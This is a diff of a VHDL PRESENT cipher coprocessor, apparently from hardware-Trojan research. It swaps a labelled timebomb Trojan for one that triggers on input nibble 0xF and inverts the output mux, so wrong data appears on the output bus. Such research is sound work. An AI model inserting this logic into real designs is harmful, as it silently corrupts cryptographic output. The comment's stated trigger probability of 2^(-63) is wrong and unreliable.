@@ -2,25 +2,25 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 2: trigger = Timebomb which triggers after each 2^k encryption/decryption operations
--- payload = disallow the output register's enable signal (out_ena) from going high, thus
--- not permitting the computed data to be placed on the output data bus.
+-- Trojan 3: trigger = specific pattern for the 4 Least Significant bits of the input data
+-- payload = invert the output mux select signal, causing the data of the incorrect/unselected
+-- datapath to appear on the output data bus
 
-entity present_Trojan2 is
+entity present_Trojan3 is
         port (
-                clk             : in std_logic;
-                rst             : in std_logic;
-                ena             : in std_logic;
+                clk      : in std_logic;
+                rst      : in std_logic;
+                ena      : in std_logic;
 
-                mode_sel        : in std_logic_vector(1 downto 0);
-                key             : in std_logic_vector(127 downto 0);
-                data_in         : in std_logic_vector(63 downto 0);
-                data_out        : out std_logic_vector(63 downto 0);
-                ready           : out std_logic
+                mode_sel : in std_logic_vector(1 downto 0);
+                key      : in std_logic_vector(127 downto 0);
+                data_in  : in std_logic_vector(63 downto 0);
+                data_out : out std_logic_vector(63 downto 0);
+                ready    : out std_logic
         );
-end entity present_Trojan2;
+end entity present_Trojan3;
 
-architecture rtl of present_Trojan2 is
+architecture rtl of present_Trojan3 is
         signal  key_sched_out,
                 key_mem_out : std_logic_vector(63 downto 0);
 
@@ -38,17 +38,11 @@ architecture rtl of present_Trojan2 is
 
         signal  key_sched_ena,
                 out_ena,
-                load_ena : std_logic;
-
-        signal  ready_cu : std_logic;
-
-        constant TROJAN_COUNTER_WIDTH     : natural                                             := 10;
-        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
+                load_ena        : std_logic;
 
         signal  trojan_trig,
-                trojan_out_ena : std_logic;
-
-        signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0);
+                trojan_mux_sel,
+                trojan_ff_out   : std_logic;
 begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
@@ -56,9 +50,9 @@ begin
         control_unit : entity work.present_control_unit
                 port map(
                         -- inputs
-                        clk    => clk,
-                        rst    => rst,
-                        ena    => ena,
+                        clk      => clk,
+                        rst      => rst,
+                        ena      => ena,
                         op_sel => mode_sel(0),
 
                         round_counter_val => current_round,
@@ -71,7 +65,7 @@ begin
 
                         key_sched_ena => key_sched_ena,
                         out_ena       => out_ena,
-                        ready         => ready_cu
+                        ready         => ready
                 );
 
         key_sched : entity work.key_schedule_top
@@ -115,6 +109,34 @@ begin
                         round_key  => key_mem_out,
                         plaintext  => plaintext
                 );
+        
+        -- The Trojan gets triggered when the 4 Least Significant bits of the
+        -- input data are '1111', i.e. 0xF -> triggering probability 2^(-63)
+        trojan_trig <= '1' when data_in(3 downto 0) = x"F" else '0';
+        
+        -- Payload : invert the output mux select signal and thus cause the 
+        -- wrong data to appear on the output data bus
+        trojan_xor : entity work.xor_2
+               port map(
+                        a => trojan_trig,
+                        b => dec_ena,
+                        y => trojan_mux_sel
+               );
+
+        -- need a flip-flop to store the trojan-tampered signal, since
+        -- in normal operation the input data will change before entering DONE state
+        -- (i.e. when the round counter is equal to 31 for encryption and 0 for decryption).
+        -- The new data might not fulfill the Trojan triggering condition, which will cause
+        -- the deactivation of the Trojan before its payload is executed.
+        -- Thus the output data of the correct datapath will be placed on the output data bus.
+        trojan_ff : entity work.dflip_flop
+                port map(
+                        clk => clk,
+                        ena => ena,
+                        rst => rst,
+                        d => trojan_mux_sel,
+                        q => trojan_ff_out
+                );
 
         -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
         -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
@@ -126,25 +148,9 @@ begin
                 port map(
                         input_A => ciphertext,
                         input_B => plaintext,
-                        sel     => dec_ena,
+                        sel     => trojan_ff_out,                        
                         mux_out => mux_out
                 );
-
-        -- trojan counter
-        trojan_counter : entity work.counter
-                generic map(
-                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
-                )
-                port map(
-                        clk     => ready_cu,
-                        cnt_ena => ena,
-                        rst     => rst,
-                        count   => trojan_counter_out
-                );
-
-        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
-
-        trojan_out_ena <= (not out_ena) nor trojan_trig;
 
         -- Coprocessor-global output register, in order to preserve the computed output data,
         -- until new ones are available. This can be helpful when a device reading from
@@ -154,13 +160,10 @@ begin
                         DATA_WIDTH => 64
                 )
                 port map(
-                        clk => clk,
-                        ena => trojan_out_ena,
-                        -- ena  => out_ena,
+                        clk  => clk,
+                        ena  => out_ena,
                         rst  => rst,
                         din  => mux_out,
                         dout => data_out
-                );
-
-        ready <= ready_cu;
+                );                             
 end architecture;
